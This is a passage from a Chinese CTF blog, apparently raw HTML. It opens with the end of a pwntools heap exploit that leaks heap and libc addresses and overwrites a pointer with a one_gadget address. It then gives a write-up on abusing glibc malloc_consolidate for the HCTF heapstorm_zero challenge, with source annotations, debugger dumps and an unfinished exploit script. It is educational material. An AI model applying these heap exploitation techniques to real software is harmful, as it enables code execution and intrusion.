class="number">4</span>,<span class="number">1</span>,<span class="number">592</span>,<span class="string">'A'</span>*<span class="number">592</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'A'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'A'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'A'</span>*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">go(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#0xb0: 6-&gt;5-&gt;4</span></span><br><span class="line"><span class="comment">#unsorted bin(0x110): 6-&gt;5-&gt;4 </span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'A'</span>*<span class="number">0xa0</span>)<span class="comment">#得到 4的EVP_CIPHER_CTX建的chunk,顺面拿出两个0xb0的chunk, 0xb0: 4</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'A'</span>*<span class="number">0xa0</span>)<span class="comment">#得到 4的EVP_CIPHER_CTX</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Ciphertext: \n"</span>)</span><br><span class="line"></span><br><span class="line">string=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">38</span>): </span><br><span class="line">    temp=a.recvline().split()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">        string+=chr(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">2</span>,len(string),string,is_go=<span class="keyword">True</span>)  <span class="comment">#解密</span></span><br><span class="line">go(<span class="number">10</span>)</span><br><span class="line">a.readuntil(<span class="string">'Ciphertext: \n'</span>)</span><br><span class="line"></span><br><span class="line">temp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    temp.append(a.recv(<span class="number">3</span>)[:<span class="number">2</span>])</span><br><span class="line">temp.reverse()</span><br><span class="line">heap_base=int(<span class="string">""</span>.join(temp),<span class="number">16</span>)<span class="number">-0x1920</span></span><br><span class="line">success(<span class="string">"heap_base ==&gt; 0x%x"</span>%heap_base)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"11 01 00 00 00 00 00 00 \na0 "</span>)</span><br><span class="line">temp=[<span class="string">'a0'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    temp.append(a.recv(<span class="number">3</span>)[:<span class="number">2</span>])</span><br><span class="line">temp.reverse()</span><br><span class="line">libc_base=int(<span class="string">""</span>.join(temp),<span class="number">16</span>)<span class="number">-352</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">1</span>,<span class="number">0x1</span>,<span class="string">'A'</span>,is_go=<span class="keyword">True</span>)<span class="comment">#0x555555758650</span></span><br><span class="line">add(<span class="number">21</span>,<span class="number">1</span>,<span class="number">0x1</span>,<span class="string">'A'</span>)</span><br><span class="line">go(<span class="number">20</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line"><span class="comment">#0xb0:21-&gt;20</span></span><br><span class="line"></span><br><span class="line">dest_chunk=heap_base+<span class="number">0x1650</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x10a38c</span></span><br><span class="line">success(<span class="string">"one_gadget_addr ==&gt; 0x%x"</span>%one_gadget)</span><br><span class="line">payload=p64(dest_chunk)+<span class="string">'\x00'</span>*<span class="number">10</span>+<span class="string">'\x10'</span><span class="comment">#   test    byte ptr [rax+12h], 10h</span></span><br><span class="line">payload=payload.ljust(<span class="number">32</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+=p64(one_gadget)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">24</span>,<span class="number">1</span>,<span class="number">0xa0</span>,payload)<span class="comment">#data_chunk = task_20的EVP_CIPHER_CTX chunk</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/12/malloc-consolidate利用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/12/malloc-consolidate利用/" itemprop="url">malloc_consolidate利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-12T10:32:03+08:00">
                2019-05-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.2k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  10
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>最近跟着别人的wp复现了hctf的heapstorm_zero，是一道关于malloc_consolidate的利用。</p>
<blockquote>
<p>参考了<a href="https://www.anquanke.com/post/id/176139#h2-1" title="从hctf,0ctf两道题目看malloc_consolidate ()" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139#h2-1</a></p>
</blockquote>
<p>自己亲自操作时，遇到了很多的坑，调试了很久才找清了原因，记录下踩到的坑。</p>
<h4 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h4><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h5><p>该函数从chunk_size最小的fastbin头开始，依次将fastbin中的chunk放入unsorted bin中，在放入unsorted bin的过程中会检查该chunk上下的chunk是否是inuse的，如果是free的则合并，一起放入unsorted bin中，合并的操作会触发unlink。<br>该函数中的一些操作可以帮助绕过unlink检查，安全客的这个wp并没有说到..可能是我太菜了..不知道..<br>先分析下关键源码:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>); <span class="comment">//获得最大的chunk_size的fastbin头</span></span><br><span class="line">   fb = &amp;fastbin (av, <span class="number">0</span>);   <span class="comment">//获得最小的chunk_size头</span></span><br><span class="line">   <span class="keyword">do</span> &#123; </span><br><span class="line">     <span class="function"><span class="title">p</span> = atomic_exchange_acq (fb, 0); //获得fb-&gt;</span>fd</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123; <span class="comment">//该循环用来遍历当前fastbin链中的chunk</span></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">//简单的检查。检查地址是否对齐等等..</span></span><br><span class="line">  <span class="function"><span class="title">nextp</span> = p-&gt;</span>fd; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  <span class="function"><span class="title">size</span> = p-&gt;</span>size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size); <span class="comment">//获取当前chunk的下一个chunk</span></span><br><span class="line">  nextsize = chunksize(nextchunk); <span class="comment">//获取当前chunk的下一个chunk的size。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果当前chunk的前一个chunk是free的，则合并，触发unlink操作</span></span><br><span class="line">    <span class="function"><span class="title">prevsize</span> = p-&gt;</span>prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span> (nextchunk != av-&gt;</span>top) &#123; <span class="comment">//如果当前chunk的下一个chunk不是top chunk</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//获取下个chunk的使用状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果是free的，则合并，触发了unlink操作</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">first_unsorted</span> = unsorted_bin-&gt;</span>fd;  <span class="comment">//将其链入unsorted bin中。</span></span><br><span class="line">    <span class="function"><span class="title">unsorted_bin</span>-&gt;</span>fd = p;</span><br><span class="line">    <span class="function"><span class="title">first_unsorted</span>-&gt;</span>bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123; <span class="comment">//如果合并后的chunk_size属于large chunk，则将以下两项设置为NULL.</span></span><br><span class="line">      <span class="function"><span class="title">p</span>-&gt;</span>fd_nextsize = NULL;</span><br><span class="line">      <span class="function"><span class="title">p</span>-&gt;</span>bk_nextsize = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE); <span class="comment">//设置该chunk的size位</span></span><br><span class="line">    <span class="function"><span class="title">p</span>-&gt;</span>bk = unsorted_bin;  </span><br><span class="line">    <span class="function"><span class="title">p</span>-&gt;</span>fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);  <span class="comment">//设置p的下一个chunk的prev_size位,该操作可以帮助绕过unlink的检查，后面会说到。</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123; <span class="comment">//如果下一个chunk是top chunk，则直接合并到top chunk中。</span></span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    <span class="function"><span class="title">av</span>-&gt;</span>top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br></pre></td></tr></table></figure></p>
<h5 id="合并实例："><a href="#合并实例：" class="headerlink" title="合并实例："></a>合并实例：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *a,*b,*c,*d;</span><br><span class="line">    a=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    b=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    c=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    d=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止被top chunk合并。</span></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">free</span>(d);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x400</span>);<span class="comment">//触发malloc_consolidate</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上代码，触发malloc_consolidate时，4个大小相同的fast chunk会被合并成一个大chunk，放入unsorted bin中.流程如下:<br>当连续free 4个chunk后，fastbin情况如下:<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pwndbg&gt; fastbins </span></span><br><span class="line"><span class="attribute">fastbins</span></span><br><span class="line"><span class="attribute">0x20</span>: 0x0</span><br><span class="line"><span class="attribute">0x30</span>: 0x602090 —▸ 0x602060 —▸ 0x602030 —▸ 0x602000 ◂— 0x0</span><br><span class="line"><span class="attribute">0x40</span>: 0x0</span><br><span class="line"><span class="attribute">0x50</span>: 0x0</span><br><span class="line"><span class="attribute">0x60</span>: 0x0</span><br><span class="line"><span class="attribute">0x70</span>: 0x0</span><br><span class="line"><span class="attribute">0x80</span>: 0x0</span><br></pre></td></tr></table></figure></p>
<p>触发malloc_consolidate后，首先处理的是链表头所指向的这个chunk(0x602090),此时情况如下:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602030</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x602000</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602060</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x602030</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602090</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020c0</span> &#123;</span><br><span class="line">  prev_size = <span class="number">48</span>, </span><br><span class="line">  size = <span class="number">32</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20f21</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>0x602090 这个chunk已经链入unsorted bin中，而且设置了prev_size位。由于malloc_consolidate会设置prev_inuse位，当处理 0x602060 这个chunk的时候就会和0x602090发生合并一同放入unsorted bin中:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602030</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x602000</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602060</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">97</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020c0</span> &#123;</span><br><span class="line">  prev_size = <span class="number">96</span>, </span><br><span class="line">  size = <span class="number">32</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20f21</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到已经合并成一个chunk_size为0x96的chunk了。以此类推，4个fastbin chunk会合并成一个大chunk放入unsorted bin中。</p>
<h4 id="踩到的各种坑…"><a href="#踩到的各种坑…" class="headerlink" title="踩到的各种坑…"></a>踩到的各种坑…</h4><p>解题方法原wp已经说的很清楚了，<strong>主要就是offbyone,和scanf触发malloc_consolidate，最后通过chunk_overlap泄露地址，然后house of orange</strong>。和原来的unsorted chunk NULL byte prison不同的地方是原来是通过直接free一个small_chunk，这样就可以后向合并了，而这里需要通过malloc_consolidate来达到合并的效果。<br>这里只是说下我碰到的不知道的地方。<br>先放上我的exp，以便后面说明.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a=process(<span class="string">"./heapstorm_zero"</span>)</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x0000000000010F6)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000001296)    </span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="comment">#add,delete</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"Please input chunk content:"</span>)</span><br><span class="line">    a.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Please input chunk index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Please input chunk index:"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_consolidate</span><span class="params">()</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">    a.sendline(<span class="string">"1"</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'0\n'</span>)<span class="comment">#0 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'1\n'</span>)<span class="comment">#1 0x40</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'2\n'</span>)<span class="comment">#2 0x80</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'3\n'</span>)<span class="comment">#3 0xc0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'4\n'</span>)<span class="comment">#4 0x100</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'5\n'</span>)<span class="comment">#5 0x140</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'6\n'</span>)<span class="comment">#6 0x180</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'7\n'</span>)<span class="comment">#7 0x1c0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'8\n'</span>)<span class="comment">#8 0x200</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'9\n'</span>)<span class="comment">#9 0x240</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'10\n'</span>)<span class="comment">#10 0x280</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">malloc_consolidate()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>)<span class="comment">#1, 0x40, offbyNULL, unsorted chunksize 0x140 ==&gt; 0x100 </span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#2 0x70</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#3 0xb0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#4 0xf0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\n'</span>)<span class="comment">#5 0x130</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\n'</span>)<span class="comment">#11</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span 